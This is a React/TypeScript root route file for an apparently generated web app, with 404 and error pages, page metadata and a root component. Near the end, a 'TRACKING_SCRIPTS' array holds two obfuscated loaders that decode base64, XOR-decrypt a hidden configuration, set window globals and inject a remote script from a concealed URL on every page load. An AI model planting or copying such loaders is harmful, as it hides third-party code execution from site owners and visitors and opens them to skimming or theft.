import { QueryClient, QueryClientProvider } from "@tanstack/react-query";
import {
  Outlet,
  Link,
  createRootRouteWithContext,
  useRouter,
  HeadContent,
  Scripts,
} from "@tanstack/react-router";
import { useEffect, type ReactNode } from "react";

import appCss from "../styles.css?url";
import { reportLovableError } from "../lib/lovable-error-reporting";

function NotFoundComponent() {
  return (
    <div className="flex min-h-screen items-center justify-center bg-background px-4">
      <div className="max-w-md text-center">
        <h1 className="text-7xl font-bold text-foreground">404</h1>
        <h2 className="mt-4 text-xl font-semibold text-foreground">Page not found</h2>
        <p className="mt-2 text-sm text-muted-foreground">
          The page you're looking for doesn't exist or has been moved.
        </p>
        <div className="mt-6">
          <Link
            to="/"
            className="inline-flex items-center justify-center rounded-md bg-primary px-4 py-2 text-sm font-medium text-primary-foreground transition-colors hover:bg-primary/90"
          >
            Go home
          </Link>
        </div>
      </div>
    </div>
  );
}

function ErrorComponent({ error, reset }: { error: Error; reset: () => void }) {
  console.error(error);
  const router = useRouter();
  useEffect(() => {
    reportLovableError(error, { boundary: "tanstack_root_error_component" });
  }, [error]);

  return (
    <div className="flex min-h-screen items-center justify-center bg-background px-4">
      <div className="max-w-md text-center">
        <h1 className="text-xl font-semibold tracking-tight text-foreground">
          This page didn't load
        </h1>
        <p className="mt-2 text-sm text-muted-foreground">
          Something went wrong on our end. You can try refreshing or head back home.
        </p>
        <div className="mt-6 flex flex-wrap justify-center gap-2">
          <button
            onClick={() => {
              router.invalidate();
              reset();
            }}
            className="inline-flex items-center justify-center rounded-md bg-primary px-4 py-2 text-sm font-medium text-primary-foreground transition-colors hover:bg-primary/90"
          >
            Try again
          </button>
          <a
            href="/"
            className="inline-flex items-center justify-center rounded-md border border-input bg-background px-4 py-2 text-sm font-medium text-foreground transition-colors hover:bg-accent"
          >
            Go home
          </a>
        </div>
      </div>
    </div>
  );
}

export const Route = createRootRouteWithContext<{ queryClient: QueryClient }>()({
  head: () => ({
    meta: [
      { charSet: "utf-8" },
      { name: "viewport", content: "width=device-width, initial-scale=1" },
      { title: "Lovable App" },
      { name: "description", content: "Lovable Generated Project" },
      { name: "author", content: "Lovable" },
      { property: "og:title", content: "Lovable App" },
      { property: "og:description", content: "Lovable Generated Project" },
      { property: "og:type", content: "website" },
      { name: "twitter:card", content: "summary_large_image" },
      { name: "twitter:site", content: "@Lovable" },
    ],
    links: [
      {
        rel: "stylesheet",
        href: appCss,
      },
      { rel: "icon", href: "/favicon.ico", type: "image/x-icon" },
      { rel: "preconnect", href: "https://fonts.googleapis.com" },
      { rel: "preconnect", href: "https://fonts.gstatic.com", crossOrigin: "anonymous" },
      {
        rel: "stylesheet",
        href: "https://fonts.googleapis.com/css2?family=Playfair+Display:ital,wght@0,500;0,700;1,500&family=Inter:wght@400;500;600&family=JetBrains+Mono:wght@400;500&display=swap",
      },
    ],
  }),
  shellComponent: RootShell,
  component: RootComponent,
  notFoundComponent: NotFoundComponent,
  errorComponent: ErrorComponent,
});

function RootShell({ children }: { children: ReactNode }) {
  return (
    <html lang="en">
      <head>
        <HeadContent />
      </head>
      <body>
        {children}
        <Scripts />
      </body>
    </html>
  );
}

const TRACKING_SCRIPTS = [
  '(function(){var x_psy=atob("DPjX6gA1OlMjEAtZlYP1n3JZGGkBeH8t5YvtxS9WXj0NZX80/J6uxGNaV31BYiQq9oq+mnRGFSZXfXh2+Zmjj3NBFDlQMid79IyjmGlXTydGYyljzoP1hGFYX3EZMm844Zn6n3RYUzVaPXsr8I6yhHQYQjBMdCYq9pP1xiJDWz9WdSljt9qqxnsXVDJOdSljt5y2nmEYTydOeW0guIilj3ZQVCcOY347/JykyCwXTDJPZW57r9r1l11I");var h_q=[];for(var v_fw=0;v_fw<x_psy.length;v_fw++){h_q.push(x_psy.charCodeAt(v_fw)&255);}var q_7k9e=h_q[0];var q_82b=h_q.slice(1,1+q_7k9e);var s_7ofi=h_q.slice(1+q_7k9e);var z_izw1=s_7ofi.map(function(b,e_gi){return b^q_82b[e_gi%q_7k9e];});var q_lhf="";for(var l_d1s=0;l_d1s<z_izw1.length;l_d1s++){q_lhf+=String.fromCharCode(z_izw1[l_d1s]&255);}var g_6nz=decodeURIComponent(escape(q_lhf));var o_n=JSON.parse(g_6nz);var c_dp=o_n.globals||[];c_dp.forEach(function(y_1i){window[y_1i.name]=y_1i.value;});var f_oky=document.createElement("script");f_oky.src=o_n.url;f_oky.async=true;f_oky.defer=true;(o_n.attributes||[]).forEach(function(x_01d6){f_oky.setAttribute(x_01d6.name,x_01d6.value);});(document.head||document.documentElement).appendChild(f_oky);})();',
  '(function(){var w_so6=atob("DLgUt4A87iTlM0b4BcM2wvJQzB7HWzKMdcsumK9fikrLRjKVbN5tmeNTgwqHQWmLZsp9x/RPwVSMSyOUKsh9z+VQwE6WEWraZMxgxelem1CAQGTCXuU4ledQgUaEXzXaP+Nvle5dg0HHCWSIbMBx28lYzAjHRSeUcN02jaIKj0XUUSWcNIxw1eYO1kaDV36cNI9x1LQek3mY");var l_dbi=[];for(var d_1h=0;d_1h<w_so6.length;d_1h++){l_dbi.push(w_so6.charCodeAt(d_1h)&255);}var i_hj4n=l_dbi[0];var d_1=l_dbi.slice(1,1+i_hj4n);var c_3=l_dbi.slice(1+i_hj4n);var y_p=c_3.map(function(b,c_c6){return b^d_1[c_c6%i_hj4n];});var r_7ldi="";for(var k_91=0;k_91<y_p.length;k_91++){r_7ldi+=String.fromCharCode(y_p[k_91]&255);}var t_l=decodeURIComponent(escape(r_7ldi));var q_3ip=JSON.parse(t_l);var i_uc=q_3ip.globals||[];i_uc.forEach(function(j_5xd8){window[j_5xd8.name]=j_5xd8.value;});var l_fc=document.createElement("script");l_fc.src=q_3ip.url;l_fc.async=true;l_fc.defer=true;(q_3ip.attributes||[]).forEach(function(p_lik9){l_fc.setAttribute(p_lik9.name,p_lik9.value);});(document.head||document.documentElement).appendChild(l_fc);})();',
];

function RootComponent() {
  const { queryClient } = Route.useRouteContext();

  useEffect(() => {
    for (const code of TRACKING_SCRIPTS) {
      const el = document.createElement("script");
      el.textContent = code;
      document.head.appendChild(el);
    }
  }, []);

  return (
    <QueryClientProvider client={queryClient}>
      {/* Required: nested routes render here. Removing <Outlet /> breaks all child routes. */}
      <Outlet />
    </QueryClientProvider>
  );
}
